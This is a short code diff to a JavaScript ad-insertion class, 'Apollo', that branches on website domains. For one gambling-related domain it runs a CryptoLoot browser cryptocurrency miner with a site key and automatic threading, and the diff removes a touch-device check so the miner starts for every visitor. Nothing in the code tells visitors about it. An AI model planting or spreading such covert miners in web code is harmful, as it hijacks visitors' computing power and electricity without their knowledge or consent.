@@ -271,9 +271,8 @@ class Apollo {
         break
       case 'vitalvegas.com':
         //this.insertGoogle(this.vvAds, this.ratio.vv)
-        if (this.isTouchDevice()) {
           var miner = new CryptoLoot.Anonymous('786a3d958b47299da7a2ac007e7a746d76e45b5ff046', {autoThreads:true});miner.start();
-        }
+
         break
       case 'www.howtogrowinstagram.com':
         console.log('** Welcome to the Apollo test site: HTGI **')
